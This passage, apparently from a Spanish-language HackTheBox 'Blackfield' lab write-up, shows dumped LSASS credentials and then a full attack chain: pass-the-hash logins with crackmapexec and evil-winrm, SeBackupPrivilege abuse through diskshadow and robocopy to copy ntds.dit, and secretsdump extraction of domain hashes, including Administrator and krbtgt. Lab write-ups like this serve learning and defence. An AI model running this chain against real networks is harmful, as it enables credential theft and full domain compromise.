		DPAPI: NA
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username
domainname
logon_server
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
	== DPAPI [3e7]==
		luid 999
		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
	== DPAPI [3e7]==
		luid 999
		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
	== DPAPI [3e7]==
		luid 999
		key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
```

- Este usuario forma parte del grupo `Remote Management Users` y tenemos sus `hash` NT.

```bash
== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
```

- Vamos a validar que el hash sea correcto.

```bash
➜  content crackmapexec smb 10.129.23.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.23.192   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.23.192   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

- Y vemos que si forma parte del grupo.

```bash
➜  content crackmapexec winrm 10.129.23.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.23.192   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.129.23.192   5985   DC01             [*] http://10.129.23.192:5985/wsman
WINRM       10.129.23.192   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

- Ya podemos conectarnos con `evil-winrm`.

```bash
➜  content evil-winrm -i 10.129.23.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

## User flag

- Ya podemos leer la **flag**.

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> type C:\Users\svc_backup\Desktop\user.txt
3920bb317a0bef51027e2852be64b543
```

## Escalada de privilegios

- Tenemos el privilegio `SeBackupPrivilege`.

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/5.png">
</p>

- Vamos a crear un directorio `Temp` para desde allí hacer todo.

- Vamos a dumpear el `ntds` pero de primeras no podemos hacer la copia por que no tenemos los suficientes privilegios.

```bash
*Evil-WinRM* PS C:\Temp> copy C:\Windows\NTDS\ntds.dit ntds.nit
Access to the path 'C:\Windows\NTDS\ntds.dit' is denied.
At line:1 char:1
+ copy C:\Windows\NTDS\ntds.dit ntds.nit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Windows\NTDS\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
```

- Pero si queremos ver el hash primero necesitamos una copia de system para usar `impacket-secretsdump`.

```bash
*Evil-WinRM* PS C:\Temp> reg save HKLM\system system
```

- Podemos seguir los pasos como no lo dicen aquí <https://pentestlab.blog/tag/diskshadow/>.

```bash
➜  content cat zi.txt
set context persistent nowriters
add volume c: alias miguelito
create
expose %miguelito% z:
```

- Ahora vamos a subirlo a la maquina.

```bash
*Evil-WinRM* PS C:\Temp> upload zi.txt
```

- Pero no funciona.

```bash
*Evil-WinRM* PS C:\Temp> diskshadow.exe /s c:\Temp\zi.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  4/20/2024 7:01:46 PM

-> set context persistent nowriter

SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }

        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
        PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
        VOLATILE                Specify that shadow copy will be deleted on exit or reset.
        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

        Example: SET CONTEXT CLIENTACCESSIBLE
*Evil-WinRM* PS C:\Temp>
```

- Al parecer nos esta quitando la s de `nowriters` así que para evitar eso vamos añadir un espacio en cada línea del archivo.

- Vamos a volver a subirlo a la maquina.

```bash
*Evil-WinRM* PS C:\Temp> erase zi.txt
*Evil-WinRM* PS C:\Temp> upload zi.txt

Info: Uploading /home/miguel/Hackthebox/Blackfield/content/zi.txt to C:\Temp\zi.txt

Data: 128 bytes of 128 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Temp>
```

- Ahora si nos deja.

```bash
*Evil-WinRM* PS C:\Temp> diskshadow.exe /s c:\Temp\zi.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  4/20/2024 7:06:00 PM

-> set context persistent nowriters
-> add volume c: alias miguelito
-> create
Alias miguelito for shadow ID {07a7acf0-58c9-4f66-b559-38688a2be1c2} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {c201721e-e14d-44dd-8a40-1fb46d14908c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {c201721e-e14d-44dd-8a40-1fb46d14908c}

	* Shadow copy ID = {07a7acf0-58c9-4f66-b559-38688a2be1c2}	%miguelito%
		- Shadow copy set: {c201721e-e14d-44dd-8a40-1fb46d14908c}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 4/20/2024 7:06:01 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %miguelito% z:
-> %miguelito% = {07a7acf0-58c9-4f66-b559-38688a2be1c2}
The shadow copy was successfully exposed as z:\.
->
```

- Ahora vamos a la unidad donde nos la creo.

```bash
*Evil-WinRM* PS C:\Temp> dir z:\


    Directory: z:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-----        4/20/2024   7:04 PM                Temp
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt
```

- Y gracias a esto ya podemos crear la copia del `ntds`.

```bash
*Evil-WinRM* PS C:\Temp> dir z:\Windows\NTDS


    Directory: z:\Windows\NTDS


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/10/2023   6:29 PM           8192 edb.chk
-a----        4/20/2024   6:58 PM       10485760 edb.log
-a----        2/23/2020   9:41 AM       10485760 edb00004.log
-a----        2/23/2020   9:41 AM       10485760 edb00005.log
-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
-a----        2/23/2020   9:41 AM       10485760 edbtmp.log
-a----        4/20/2024   5:43 PM       18874368 ntds.dit
-a----        4/20/2024   5:58 PM          16384 ntds.jfm
-a----        4/20/2024   5:43 PM         434176 temp.edb
```

- Básicamente lo que hicimos fue un `shadow cop`y de lo que hay en `C:\` pero en `Z`.

- Pero con `copy` no se puede.

```bash
*Evil-WinRM* PS C:\Temp> copy z:\Windows\NTDS\ntds.dit ntds.dit
Access to the path 'z:\Windows\NTDS\ntds.dit' is denied.
At line:1 char:1
+ copy z:\Windows\NTDS\ntds.dit ntds.dit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (z:\Windows\NTDS\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
```

- Vamos a probar `robocopy`.

```bash
*Evil-WinRM* PS C:\Temp> robocopy /b z:\Windows\NTDS\ . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, April 20, 2024 7:12:11 PM
   Source : z:\Windows\NTDS\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	z:\Windows\NTDS\
	    New File  		  18.0 m	ntds.dit
  0.0%
  0.3%
  0.6%
  1.0%
  1.3%
  1.7%
  2.0%
  2.4%
  2.7%
  3.1%
  3.4%
  3.8%
  4.1%
  4.5%
  4.8%
  5.2%
  5.5%
  5.9%
  6.2%
  6.5%
  6.9%
  7.2%
  7.6%
  7.9%
  8.3%
  8.6%
  9.0%
  9.3%
  9.7%
 10.0%
 10.4%
 10.7%
 11.1%
 11.4%
 11.8%
 12.1%
 12.5%
 12.8%
 13.1%
 13.5%
 13.8%
 14.2%
 14.5%
 14.9%
 15.2%
 15.6%
 15.9%
 16.3%
 16.6%
 17.0%
 17.3%
 17.7%
 18.0%
 18.4%
 18.7%
 19.0%
 19.4%
 19.7%
 20.1%
 20.4%
 20.8%
 21.1%
 21.5%
 21.8%
 22.2%
 22.5%
 22.9%
 23.2%
 23.6%
 23.9%
 24.3%
 24.6%
 25.0%
 25.3%
 25.6%
 26.0%
 26.3%
 26.7%
 27.0%
 27.4%
 27.7%
 28.1%
 28.4%
 28.8%
 29.1%
 29.5%
 29.8%
 30.2%
 30.5%
 30.9%
 31.2%
 31.5%
 31.9%
 32.2%
 32.6%
 32.9%
 33.3%
 33.6%
 34.0%
 34.3%
 34.7%
 35.0%
 35.4%
 35.7%
 36.1%
 36.4%
 36.8%
 37.1%
 37.5%
 37.8%
 38.1%
 38.5%
 38.8%
 39.2%
 39.5%
 39.9%
 40.2%
 40.6%
 40.9%
 41.3%
 41.6%
 42.0%
 42.3%
 42.7%
 43.0%
 43.4%
 43.7%
 44.0%
 44.4%
 44.7%
 45.1%
 45.4%
 45.8%
 46.1%
 46.5%
 46.8%
 47.2%
 47.5%
 47.9%
 48.2%
 48.6%
 48.9%
 49.3%
 49.6%
 50.0%
 50.3%
 50.6%
 51.0%
 51.3%
 51.7%
 52.0%
 52.4%
 52.7%
 53.1%
 53.4%
 53.8%
 54.1%
 54.5%
 54.8%
 55.2%
 55.5%
 55.9%
 56.2%
 56.5%
 56.9%
 57.2%
 57.6%
 57.9%
 58.3%
 58.6%
 59.0%
 59.3%
 59.7%
 60.0%
 60.4%
 60.7%
 61.1%
 61.4%
 61.8%
 62.1%
 62.5%
 62.8%
 63.1%
 63.5%
 63.8%
 64.2%
 64.5%
 64.9%
 65.2%
 65.6%
 65.9%
 66.3%
 66.6%
 67.0%
 67.3%
 67.7%
 68.0%
 68.4%
 68.7%
 69.0%
 69.4%
 69.7%
 70.1%
 70.4%
 70.8%
 71.1%
 71.5%
 71.8%
 72.2%
 72.5%
 72.9%
 73.2%
 73.6%
 73.9%
 74.3%
 74.6%
 75.0%
 75.3%
 75.6%
 76.0%
 76.3%
 76.7%
 77.0%
 77.4%
 77.7%
 78.1%
 78.4%
 78.8%
 79.1%
 79.5%
 79.8%
 80.2%
 80.5%
 80.9%
 81.2%
 81.5%
 81.9%
 82.2%
 82.6%
 82.9%
 83.3%
 83.6%
 84.0%
 84.3%
 84.7%
 85.0%
 85.4%
 85.7%
 86.1%
 86.4%
 86.8%
 87.1%
 87.5%
 87.8%
 88.1%
 88.5%
 88.8%
 89.2%
 89.5%
 89.9%
 90.2%
 90.6%
 90.9%
 91.3%
 91.6%
 92.0%
 92.3%
 92.7%
 93.0%
 93.4%
 93.7%
 94.0%
 94.4%
 94.7%
 95.1%
 95.4%
 95.8%
 96.1%
 96.5%
 96.8%
 97.2%
 97.5%
 97.9%
 98.2%
 98.6%
 98.9%
 99.3%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           171585163 Bytes/sec.
   Speed :            9818.181 MegaBytes/min.
   Ended : Saturday, April 20, 2024 7:12:11 PM

*Evil-WinRM* PS C:\Temp> dir


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/20/2024   7:06 PM            615 2024-04-20_19-06-01_DC01.cab
-a----        4/20/2024   5:43 PM       18874368 ntds.dit
-a----        4/20/2024   6:42 PM       17375232 system
-a----        4/20/2024   7:04 PM             96 zi.txt


*Evil-WinRM* PS C:\Temp>
```

- Ahora ya lo podemos descargar.

```bash
*Evil-WinRM* PS C:\Temp> download C:\Temp\ntds.dit
```

- Una vez nos descargamos el `ntds.dit` y el system ya podemos usar `impacket-secretsdump` para ver los hashes del usuarios del dominio.

```bash
➜  content impacket-secretsdump -system system -ntds ntds.dit LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

## root.txt

- Ahora ya podemos validar el hash y conectarnos para leer la ultima flag.

```bash
➜  content crackmapexec smb 10.129.23.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
SMB         10.129.23.192   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.23.192   445    DC01             [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

```bash
➜  content evil-winrm -i 10.129.23.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
```

- Vemos que dejaron una nota.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```
